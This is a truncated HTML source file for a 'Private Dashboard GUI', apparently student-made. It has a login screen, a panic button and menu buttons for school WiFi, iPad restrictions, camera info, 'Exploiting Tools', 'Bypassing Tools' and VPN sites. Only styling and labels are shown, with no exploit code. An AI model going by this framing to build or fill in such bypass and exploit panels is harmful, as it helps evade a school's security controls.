<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <!-- Tailwind CSS CDN -->
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    /* Base & Theme Variables (using HSL for dynamic theming) */
    :root {
        --bg-color: 0 0% 100%; /* Light background */
        --text-color: 222.2 84% 4.9%; /* Dark foreground */
        --card-bg: 0 0% 100%;
        --border-color: 214.3 31.8% 91.4%;
        --primary-color: 25 95% 65%; /* Orange */
        --secondary-color: 40 100% 70%; /* Yellow */
        --accent-color: 220 80% 60%; /* Blue */
        --error-color: 0 100% 50%; /* Red */
    }
    .dark-theme {
        --bg-color: 222.2 84% 4.9%; /* Dark background */
        --text-color: 210 40% 98%; /* Light foreground */
        --card-bg: 222.2 84% 4.9%;
        --border-color: 217.2 32.6% 17.5%;
        --primary-color: 25 95% 65%; /* Orange */
        --secondary-color: 40 100% 70%; /* Yellow */
        --accent-color: 220 80% 60%; /* Blue */
        --error-color: 0 100% 50%; /* Red */
    }
    /* Additional Themes (Examples) */
    .blue-theme {
        --bg-color: 210 30% 15%;
        --text-color: 210 40% 98%;
        --card-bg: 210 30% 20%;
        --border-color: 210 20% 30%;
        --primary-color: 220 80% 60%; /* Blue */
        --secondary-color: 180 70% 50%; /* Cyan */
        --accent-color: 270 70% 60%; /* Purple */
        --error-color: 0 100% 60%;
    }
    .green-theme {
        --bg-color: 120 15% 15%;
        --text-color: 120 40% 98%;
        --card-bg: 120 15% 20%;
        --border-color: 120 10% 30%;
        --primary-color: 120 60% 50%; /* Green */
        --secondary-color: 60 70% 60%; /* Lime */
        --accent-color: 300 70% 60%; /* Magenta */
        --error-color: 0 100% 60%;
    }


    /* General Body Styles */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }
    
    body {
      margin: 0; padding: 0;
      background-color: hsl(var(--bg-color));
      color: hsl(var(--text-color));
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      transition: background-color 0.3s, color 0.3s;
      flex-direction: column;
      zoom: 1; /* Default zoom */
    }

    /* Initializing Screen */
    #initializationScreen, #dashboardLoadingScreen {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: #000;
      color: #fff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      opacity: 0;
      visibility: hidden;
      transition: opacity 1s ease-in-out, visibility 1s ease-in-out;
    }
    #initializationScreen.active, #dashboardLoadingScreen.active {
      opacity: 1;
      visibility: visible;
    }

    .rotating-box-container {
      perspective: 800px;
      margin-bottom: 20px;
    }
    .rotating-box {
      width: 100px;
      height: 100px;
      background: linear-gradient(45deg, #ff914d, #ff4c4c); /* Orange to Red */
      border-radius: 10px;
      animation: rotate3D 5s infinite linear;
      transform-style: preserve-3d;
      box-shadow: 0 0 20px rgba(255, 145, 77, 0.7);
    }

    @keyframes rotate3D {
      0% { transform: rotateX(0deg) rotateY(0deg) rotateZ(0deg); }
      100% { transform: rotateX(360deg) rotateY(360deg) rotateZ(360deg); }
    }

    #initText, #loadingCodeText {
      font-size: 1.5em;
      font-weight: bold;
      margin-top: 15px;
      animation: textGradient 3s infinite alternate, pulse 1.5s infinite alternate;
    }
    #loadingCodeText {
        animation: textGradient 3s infinite alternate, typing 3s steps(30, end) infinite, blink-caret .75s step-end infinite;
        white-space: nowrap;
        overflow: hidden;
        border-right: .15em solid orange; /* The caret */
    }
    @keyframes textGradient {
      0% { color: #ff914d; }
      50% { color: #ff4c4c; }
      100% { color: #ff914d; }
    }
    @keyframes pulse {
        0% { transform: scale(1); }
        100% { transform: scale(1.05); }
    }
    @keyframes typing {
        from { width: 0 }
        to { width: 100% }
    }
    @keyframes blink-caret {
        from, to { border-color: transparent }
        50% { border-color: orange; }
    }

    /* Login Page Specific Styles */
    .login-wrapper {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      width: 100%;
      height: 100%;
    }

    .login-quick-bar {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        display: flex;
        justify-content: flex-start;
        gap: 10px;
        padding: 10px;
        background: rgba(0,0,0,0.7);
        z-index: 50;
        box-shadow: 0 2px 10px rgba(0,0,0,0.3);
    }
    .login-quick-bar button {
        background-color: hsl(var(--primary-color));
        border: none;
        padding: 8px 12px;
        border-radius: 6px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s;
        display: flex;
        align-items: center;
        gap: 5px;
    }
    .login-quick-bar button:hover {
        background-color: hsl(var(--secondary-color));
    }


    .login-box {
      background: hsl(var(--card-bg));
      border-radius: 16px; /* More rounded */
      border: 3px solid white;
      box-shadow: 0 0 10px white;
      width: 320px; /* More square */
      height: auto; /* Auto height based on content */
      padding: 30px 25px;
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s, background-color 0.3s;
      margin-top: 20px; /* Space for the quick bar */
    }
    
    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }
    
    @keyframes flashRed {
      0%, 100% { border-color: hsl(var(--error-color)); box-shadow: 0 0 15px hsl(var(--error-color)); }
      50% { border-color: white; box-shadow: 0 0 5px white; }
    }
    
    .login-box h2 {
      font-size: 1.7em;
      margin-bottom: 20px;
      font-family: 'Courier New', monospace;
      color: hsl(var(--text-color));
    }
    
    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background: hsl(var(--border-color));
      border: none;
      color: hsl(var(--text-color));
      border-radius: 8px;
      font-size: 1em;
      transition: background 0.3s, color 0.3s;
    }
    
    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.9em;
      margin-bottom: 10px;
      gap: 10px;
      cursor: pointer;
    }

    /* Custom Toggle Switch for Show Password and 24-hour format */
    .custom-toggle {
        position: relative;
        display: inline-block;
        width: 44px;
        height: 24px;
    }
    .custom-toggle input {
        opacity: 0;
        width: 0;
        height: 0;
    }
    .custom-toggle-slider {
        position: absolute;
        cursor: pointer;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: #ccc;
        transition: 0.4s;
        border-radius: 24px;
    }
    .custom-toggle-slider:before {
        position: absolute;
        content: "";
        height: 20px;
        width: 20px;
        left: 2px;
        bottom: 2px;
        background-color: white;
        transition: 0.4s;
        border-radius: 50%;
    }
    input:checked + .custom-toggle-slider {
        background-color: #4CAF50; /* Green when checked */
    }
    input:checked + .custom-toggle-slider:before {
        transform: translateX(20px);
    }
    
    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: hsl(var(--primary-color));
      color: black;
      font-size: 1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    .login-box button:hover {
        background-color: hsl(var(--secondary-color));
    }
    
    .attempt-counter, .error-message {
      margin-top: 10px;
      font-size: 0.85em;
      color: hsl(var(--error-color));
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: hsl(var(--card-bg));
      border: 3px solid white;
      border-radius: 15px;
      box-shadow: 0 0 10px white;
      z-index: 10;
      transition: background-color 0.3s;
    }
    
    .popup input {
      margin-bottom: 15px;
    }

    #dateTimeBox {
        margin-top: 20px;
        background: hsl(var(--card-bg));
        border: 1px solid hsl(var(--border-color));
        border-radius: 10px;
        padding: 15px 20px;
        display: flex;
        flex-direction: column;
        gap: 10px;
        width: 320px;
        box-shadow: 0 0 8px rgba(0,0,0,0.2);
        transition: background-color 0.3s, border-color 0.3s;
    }
    #dateTimeBox .time-date-display {
        font-size: 1.1em;
        font-weight: bold;
        color: hsl(var(--primary-color));
    }
    #dateTimeBox label {
        display: flex;
        align-items: center;
        justify-content: space-between;
        font-size: 0.9em;
        margin-top: 5px;
    }

    /* Dashboard Specific Styles */
    .dashboard-container {
      width: 100%;
      max-width: 1400px; /* Or a suitable max-width */
      padding: 20px;
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: hsl(var(--primary-color));
      padding: 15px 25px;
      border-radius: 12px;
      color: #000;
      margin-bottom: 20px;
      transition: background-color 0.3s, color 0.3s;
    }

    .dashboard-header h1 {
      font-size: 24px;
    }

    .user-info {
      font-weight: bold;
      color: rgba(0,0,0,0.7);
    }

    .version-box {
      background: hsl(var(--secondary-color));
      padding: 8px 15px;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
      transition: background-color 0.3s;
    }

    .quick-bar {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 10px;
      flex-wrap: wrap;
    }

    .quick-bar button, .dashboard-grid-button {
      background-color: hsl(var(--primary-color));
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      min-width: 110px;
      white-space: nowrap;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 5px;
    }

    .quick-bar button:hover, .dashboard-grid-button:hover {
      background-color: hsl(var(--secondary-color));
    }

    #panicBtn {
      background: hsl(var(--error-color)) !important;
      color: white !important;
    }

    .announcement-bar {
      width: 100%;
      background-color: hsl(var(--primary-color));
      color: black;
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
      transition: background-color 0.3s;
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% { transform: translateX(0%); }
      100% { transform: translateX(-100%); }
    }

    .main-row {
      display: grid; /* Use grid for more control */
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); /* Responsive grid */
      gap: 20px;
      margin-bottom: 20px;
    }

    .box, .info-panel {
      background-color: hsl(var(--card-bg));
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 10px hsla(var(--primary-color), 0.3);
      min-height: 120px;
      transition: background-color 0.3s, color 0.3s, box-shadow 0.3s;
      position: relative; /* For dragging */
      cursor: grab; /* Indicate draggable */
    }
    .box:active, .info-panel:active {
        cursor: grabbing;
    }

    .box h2, .info-panel h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: hsl(var(--accent-color));
      transition: color 0.3s;
    }

    .update-entry {
      background: hsla(var(--primary-color), 0.2);
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: hsl(var(--text-color));
      transition: background-color 0.3s, color 0.3s;
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    .calendar div {
      padding: 6px;
      background: hsla(var(--primary-color), 0.3);
      border-radius: 4px;
      transition: background-color 0.3s;
    }

    .today {
      background: hsl(var(--primary-color)) !important;
      font-weight: bold;
      color: black;
    }

    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
      background-color: hsl(var(--card-bg));
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 10px hsla(var(--primary-color), 0.3);
      width: fit-content;
      max-width: 90vw;
      margin-left: auto;
      margin-right: auto;
    }

    #notesCanvas {
      border: 2px solid hsl(var(--primary-color));
      border-radius: 12px;
      background: #fff; /* Canvas background always white for drawing */
      cursor: crosshair;
      touch-action: none;
    }

    #canvasControls {
      margin-top: 10px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 8px;
    }

    #canvasControls button, #canvasControls input[type="color"], #canvasControls input[type="range"] {
      background-color: hsl(var(--primary-color));
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      margin: 0;
    }
    #canvasControls button:hover {
        background-color: hsl(var(--secondary-color));
    }
    #canvasControls input[type="color"] {
        padding: 4px;
        width: 40px;
        height: 38px;
        -webkit-appearance: none;
        border: none;
        border-radius: 8px;
        overflow: hidden;
    }
    #canvasControls input[type="color"]::-webkit-color-swatch-wrapper {
        padding: 0;
    }
    #canvasControls input[type="color"]::-webkit-color-swatch {
        border: none;
    }
    #canvasControls input[type="range"] {
        -webkit-appearance: none;
        height: 38px;
        background: hsl(var(--primary-color));
        padding: 0 10px;
        border-radius: 8px;
        width: 100px;
        accent-color: hsl(var(--accent-color));
    }
    #canvasControls input[type="range"]::-webkit-slider-thumb {
        -webkit-appearance: none;
        width: 15px;
        height: 15px;
        border-radius: 50%;
        background: black;
        cursor: pointer;
    }


    .motivation-box {
      background-color: hsla(var(--primary-color), 0.2);
      color: hsl(var(--text-color));
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px hsla(var(--primary-color), 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
      transition: background-color 0.3s, color 0.3s, box-shadow 0.3s;
    }

    /* Info Panel Styles */
    .info-panel {
      display: none;
      background-color: hsl(var(--card-bg));
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: 0 0 15px hsla(var(--primary-color), 0.3);
      transition: background-color 0.3s;
    }

    .info-panel h2 {
      color: hsl(var(--primary-color));
      margin-bottom: 15px;
      transition: color 0.3s;
    }

    .wifi-grid {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 15px;
    }

    .wifi-grid div {
      padding: 8px;
      background: hsla(var(--primary-color), 0.3);
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
      transition: background-color 0.3s;
    }

    .wifi-entry {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 10px;
    }

    .wifi-entry div {
      padding: 8px;
      background: hsla(var(--primary-color), 0.2);
      border-radius: 6px;
      text-align: center;
      transition: background-color 0.3s;
    }
    /* WiFi Level Colors */
    .wifi-level-high { background-color: #2ecc71 !important; } /* Green */
    .wifi-level-medium { background-color: #f1c40f !important; } /* Yellow */
    .wifi-level-low { background-color: #e74c3c !important; } /* Red */

    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .handbook-buttons button, .links-list a, .exploit-buttons a, .bypass-buttons button {
      background-color: hsl(var(--primary-color));
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      text-decoration: none;
      text-align: center;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 5px;
    }

    .handbook-buttons button:hover, .links-list a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover {
      background-color: hsl(var(--secondary-color));
    }

    .coming-soon, .info-text {
      background: hsla(var(--primary-color), 0.2);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
      transition: background-color 0.3s;
    }

    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .school-info-item {
      background: hsla(var(--primary-color), 0.2);
      padding: 12px;
      border-radius: 8px;
      transition: background-color 0.3s;
    }

    .school-info-label {
      font-weight: bold;
      color: hsl(var(--primary-color));
      margin-bottom: 5px;
      transition: color 0.3s;
    }

    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    .ipad-options button {
      flex: 1;
      background-color: hsl(var(--primary-color));
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    .ipad-options button:hover {
      background-color: hsl(var(--secondary-color));
    }

    .ipad-content, .bypass-content {
      display: none;
      background: hsla(var(--primary-color), 0.2);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      transition: background-color 0.3s;
    }

    /* Dashboard Notification */
    .dashboard-notification {
        position: fixed;
        top: 20px;
        right: 20px;
        background-color: hsl(var(--primary-color));
        color: black;
        padding: 15px 20px;
        border-radius: 10px;
        box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        z-index: 100;
        opacity: 0;
        visibility: hidden;
        transform: translateY(-20px);
        transition: opacity 0.3s ease-out, transform 0.3s ease-out, visibility 0.3s ease-out;
        display: flex;
        align-items: center;
        gap: 10px;
    }
    .dashboard-notification.show {
        opacity: 1;
        visibility: visible;
        transform: translateY(0);
    }
    .dashboard-notification .close-btn {
        background: none;
        border: none;
        color: black;
        font-size: 1.2em;
        cursor: pointer;
    }

    /* Draggable panel handle */
    .drag-handle {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 30px; /* Make handle visible */
        cursor: grab;
        /* background: rgba(255,255,255,0.05); /* Debugging visual for handle */
        border-top-left-radius: 12px;
        border-top-right-radius: 12px;
        z-index: 1; /* Ensure handle is clickable */
    }

    /* Settings Panel Layout */
    .settings-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
        gap: 15px;
        margin-top: 15px;
    }
    .setting-item {
        background: hsla(var(--primary-color), 0.2);
        padding: 12px;
        border-radius: 8px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        font-size: 0.9em;
    }
    .setting-item label {
        margin: 0;
    }
    .setting-item .text-input {
        background: hsla(var(--primary-color), 0.1);
        border: 1px solid hsla(var(--primary-color), 0.3);
        padding: 6px;
        border-radius: 5px;
        color: hsl(var(--text-color));
        width: 100px; /* Smaller input */
    }
    .setting-item select {
        background: hsla(var(--primary-color), 0.1);
        border: 1px solid hsla(var(--primary-color), 0.3);
        padding: 6px;
        border-radius: 5px;
        color: hsl(var(--text-color));
    }

    /* Keybinds Panel */
    .keybinds-grid {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 10px;
        margin-top: 15px;
    }
    .keybind-item {
        background: hsla(var(--primary-color), 0.2);
        padding: 10px;
        border-radius: 8px;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }
    .keybind-input {
        background: hsla(var(--primary-color), 0.1);
        border: 1px solid hsla(var(--primary-color), 0.3);
        padding: 5px;
        border-radius: 5px;
        color: hsl(var(--text-color));
        width: 80px;
        text-align: center;
        cursor: pointer;
    }

    /* Stats & Activity Logs */
    .log-entry {
        background: hsla(var(--primary-color), 0.1);
        padding: 8px;
        margin-bottom: 5px;
        border-radius: 6px;
        font-size: 0.9em;
    }
    #activityLogsPanel textarea, #loginHistoryPanel textarea {
        width: 100%;
        height: 250px;
        background: hsla(var(--primary-color), 0.1);
        border: 1px solid hsla(var(--primary-color), 0.3);
        border-radius: 8px;
        padding: 10px;
        color: hsl(var(--text-color));
        font-family: monospace;
        resize: vertical;
    }
    #calculatorPanel input[type="text"] {
        width: 100%;
        padding: 10px;
        font-size: 1.5em;
        text-align: right;
        margin-bottom: 10px;
        background: hsla(var(--primary-color), 0.1);
        border: 1px solid hsla(var(--primary-color), 0.3);
        border-radius: 8px;
        color: hsl(var(--text-color));
    }
    #calculatorPanel .calc-grid {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 5px;
    }
    #calculatorPanel .calc-grid button {
        padding: 15px;
        font-size: 1.2em;
        background-color: hsl(var(--primary-color));
        color: black;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        transition: background-color 0.2s;
    }
    #calculatorPanel .calc-grid button:hover {
        background-color: hsl(var(--secondary-color));
    }

    /* Media Panel */
    #mediaPanel iframe {
        width: 100%;
        height: 400px;
        border: none;
        border-radius: 8px;
    }
  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
</head>
<body>

  <!-- Initialization Screen -->
  <div id="initializationScreen" class="active">
    <div class="rotating-box-container">
      <div class="rotating-box"></div>
    </div>
    <div id="initText">Initializing System...</div>
  </div>

  <!-- Dashboard Loading Screen -->
  <div id="dashboardLoadingScreen">
    <div class="rotating-box-container">
        <div class="rotating-box"></div>
    </div>
    <div id="loadingCodeText">Loading Dashboard...</div>
    <div id="codeAnimationBox" class="mt-4 p-4 bg-gray-800 rounded-lg shadow-lg text-green-400 font-mono text-sm" style="width:300px; height:100px; overflow:hidden;">
        <!-- Code pieces will be added here by JS -->
    </div>
  </div>

  <!-- Login Page (hidden by default) -->
  <div class="login-wrapper" id="loginWrapper" style="display: none;">
    <div class="login-quick-bar">
        <button id="loginPanicBtn">üö® Panic</button>
        <button id="loginZoomInBtn">‚ûï Zoom In</button>
        <button id="loginZoomOutBtn">‚ûñ Zoom Out</button>
    </div>

    <div class="login-box" id="loginBox">
      <h2>ùôãùôßùôûùô´ùôñùô©ùôö ùôéùôÆùô®ùô©ùôöùô¢</h2>

      <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
      <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
      <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

      <label for="showPasswordToggle">
        <span>Show Password</span>
        <label class="custom-toggle">
            <input type="checkbox" id="showPasswordToggle">
            <span class="custom-toggle-slider"></span>
        </label>
      </label>

      <button id="submitBtn">Submit</button>

      <div class="error-message" id="errorMsg"></div>
      <div class="attempt-counter" id="attemptsText">Attempts Left: 3</div>

      <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
        <p>Too many failed attempts.</p>
        <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
        <button id="resetBtn">Reset Counter</button>
      </div>
    </div>

    <div id="dateTimeBox">
        <div class="time-date-display" id="displayTime">00:00:00</div>
        <div class="time-date-display" id="displayDate">--</div>
        <label>
            <span>24-Hour Format</span>
            <label class="custom-toggle">
                <input type="checkbox" id="toggle24HourFormat">
                <span class="custom-toggle-slider"></span>
            </label>
        </label>
    </div>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" class="dashboard-container" style="display: none;">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.5.6</div>
    </div>

    <div class="quick-bar">
      <input type="text" id="dashboardSearch" placeholder="Search dashboard sections..." class="bg-gray-700 text-white p-2 rounded-lg flex-grow max-w-xs" />
      <button id="sessionTime">‚è≥ Session Time: 00:00:00</button>
      <button id="realTimeClock">üïí --:--:--</button>
      <button id="realDate">üìÖ --</button>
      <button id="notesBtn">üìí Notes</button>
      <button id="exportNotesBtn">üíæ Export Notes</button>
      <button id="screenshotBtn">üì∏ Screenshot</button>
      <button id="toggleSectionsBtn">‚¨ÜÔ∏è Toggle Sections</button>
      <button id="fixIssuesBtn">üõ†Ô∏è Fix Issues</button>
      <button id="fullScreenBtn">üñ•Ô∏è Full Screen</button>
      <button id="restartBtn">üîÑ Restart</button>
      <button id="themeSelectBtn">üé® Themes</button>
      <button id="logoutBtn">üîì Log Out</button>
    </div>
    
    <div id="announcementBar" class="announcement-bar">
      <span>üö® Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! üö®</span>
    </div>
    
    <!-- Dashboard Notification -->
    <div id="dashboardNotification" class="dashboard-notification">
        <span id="notificationMessage">Welcome!</span>
        <button class="close-btn">&times;</button>
    </div>

    <div class="main-row" id="mainGrid">
      
      <div class="box" id="calendarBox">
        <div class="drag-handle"></div>
        <h2>üìÖ Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox">
        <div class="drag-handle"></div>
        "Success is not final, failure is not fatal: It is the courage to continue that counts." ‚Äì Winston Churchill
      </div>

      <div class="box" id="updatesBox">
        <div class="drag-handle"></div>
        <h2>üîÑ Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
      </div>

      <div class="box" id="notificationsBox">
        <div class="drag-handle"></div>
        <h2>üîî Notifications</h2>
        <p>Starting to work on the log in system. Stay tuned for more!</p>
      </div>

      <!-- New Panels in main grid -->
      <div class="box" id="randomFactBox">
        <div class="drag-handle"></div>
        <h2>üí° Random Fact</h2>
        <p id="randomFactContent">Loading fact...</p>
        <button class="dashboard-grid-button mt-3" onclick="dashboard.displayRandomFact()">New Fact</button>
      </div>
      <div class="box" id="dailyQuoteBox">
        <div class="drag-handle"></div>
        <h2>üí¨ Daily Quote</h2>
        <p id="dailyQuoteContent">Loading quote...</p>
        <button class="dashboard-grid-button mt-3" onclick="dashboard.displayDailyQuote()">New Quote</button>
      </div>
      <div class="box" id="utilityBarBox">
        <div class="drag-handle"></div>
        <h2>‚öôÔ∏è Utility Bar</h2>
        <div class="flex flex-wrap gap-2 mt-3 justify-center">
            <button class="dashboard-grid-button" id="downloadLogsBtn">‚¨áÔ∏è Download Activity Logs</button>
            <button class="dashboard-grid-button" id="panicBtnMain">üö® Panic</button>
            <button class="dashboard-grid-button" id="zoomInBtn">‚ûï Zoom In</button>
            <button class="dashboard-grid-button" id="zoomOutBtn">‚ûñ Zoom Out</button>
        </div>
      </div>
    </div>

    <div class="quick-bar" style="flex-wrap: wrap; margin-top: 30px;">
      <button onclick="dashboard.togglePanel('settingsPanel')">‚öôÔ∏è Settings</button>
      <button onclick="dashboard.togglePanel('wifiPanel')">üì° School WiFi Info</button>
      <button onclick="dashboard.togglePanel('ipadPanel')">üì± School iPad Restrictions</button>
      <button onclick="dashboard.togglePanel('handbookPanel')">üìò Student Handbooks Info</button>
      <button onclick="dashboard.togglePanel('mapPanel')">üè´ School Building Map Info</button>
      <button onclick="dashboard.togglePanel('studentWebsitesPanel')">üåê Student Website's Info</button>
      <button onclick="dashboard.togglePanel('teacherWebsitesPanel')">üë©‚Äçüè´ Teacher Websites Info</button>
      <button onclick="dashboard.togglePanel('phoneDirectoryPanel')">üìû School Phone Directory Info</button>
      <button onclick="dashboard.togglePanel('cameraPanel')">üì∑ School Camera Info</button>
      <button onclick="dashboard.togglePanel('schoolInfoPanel')">üè´ School Information</button>
      <button onclick="dashboard.togglePanel('exploitPanel')">üß® Exploiting Tools</button>
      <button onclick="dashboard.togglePanel('bypassPanel')">üö™ Bypassing Tools</button>
      <button onclick="dashboard.togglePanel('vpnPanel')">üîê VPN Websites</button>
      <button onclick="dashboard.togglePanel('gamingPanel')">üéÆ Gaming Websites</button>
      <button onclick="dashboard.togglePanel('musicPanel')">üéµ Music Websites</button>
      <button onclick="dashboard.togglePanel('keyboardPanel')">üéπ Keyboard Tricks</button>
      <button onclick="dashboard.togglePanel('keybindsPanel')">‚å®Ô∏è Keybinds</button>
      <button onclick="dashboard.togglePanel('timerStopwatchPanel')">‚è±Ô∏è Timer/Stopwatch</button>
      <button onclick="dashboard.togglePanel('activityLogsPanel')">üìú Activity Logs</button>
      <button onclick="dashboard.togglePanel('loginHistoryPanel')">üë§ Login History</button>
      <button onclick="dashboard.togglePanel('calculatorPanel')">üßÆ Calculator</button>
      <button onclick="dashboard.togglePanel('unitConverterPanel')">üîÑ Unit Converter</button>
      <button onclick="dashboard.togglePanel('statsPanel')">üìä Stats</button>
      <button onclick="dashboard.togglePanel('mediaPanel')">‚ñ∂Ô∏è Media</button>
      <button onclick="dashboard.togglePanel('reminderPanel')">üîî Reminders</button>
    </div>

    <!-- Information Panels (outside main grid for full width) -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
      <!-- Settings Panel -->
      <div id="settingsPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>‚öôÔ∏è Settings</h2>
        <div class="settings-grid">
            <div class="setting-item">
                <span>Theme</span>
                <select id="themeSelector">
                    <option value="dark-theme">Dark</option>
                    <option value="light-theme">Light</option>
                    <option value="blue-theme">Blue</option>
                    <option value="green-theme">Green</option>
                </select>
            </div>
            <div class="setting-item">
                <span>Notification Sound (Visual)</span>
                <label class="custom-toggle">
                    <input type="checkbox" id="notificationSoundToggle">
                    <span class="custom-toggle-slider"></span>
                </label>
            </div>
            <div class="setting-item">
                <span>Font Size (px)</span>
                <input type="number" id="fontSizeSetting" class="text-input" value="16" min="12" max="24">
            </div>
            <div class="setting-item">
                <span>Auto-save interval (s)</span>
                <input type="number" id="autoSaveInterval" class="text-input" value="60" min="10">
            </div>
            <div class="setting-item">
                <span>Enable Animations</span>
                <label class="custom-toggle">
                    <input type="checkbox" id="enableAnimations" checked>
                    <span class="custom-toggle-slider"></span>
                </label>
            </div>
            <div class="setting-item">
                <span>Show Welcome Notification</span>
                <label class="custom-toggle">
                    <input type="checkbox" id="showWelcomeNotification" checked>
                    <span class="custom-toggle-slider"></span>
                </label>
            </div>
            <div class="setting-item">
                <span>Dashboard Grid Layout</span>
                <select id="dashboardLayout">
                    <option value="default">Default</option>
                    <option value="compact">Compact</option>
                </select>
            </div>
            <div class="setting-item">
                <span>Language</span>
                <select id="languageSetting">
                    <option value="en">English</option>
                    <option value="es">Spanish</option>
                </select>
            </div>
            <div class="setting-item">
                <span>Timezone</span>
                <input type="text" id="timezoneSetting" class="text-input" value="UTC">
            </div>
            <div class="setting-item">
                <span>Data Sync</span>
                <button class="dashboard-grid-button">Sync Now</button>
            </div>
            <div class="setting-item">
                <span>Clear Cache</span>
                <button class="dashboard-grid-button">Clear</button>
            </div>
            <div class="setting-item">
                <span>Export Settings</span>
                <button class="dashboard-grid-button">Export</button>
            </div>
            <div class="setting-item">
                <span>Import Settings</span>
                <button class="dashboard-grid-button">Import</button>
            </div>
            <div class="setting-item">
                <span>Reset All Settings</span>
                <button class="dashboard-grid-button bg-red-500">Reset</button>
            </div>
            <div class="setting-item">
                <span>Privacy Mode</span>
                <label class="custom-toggle">
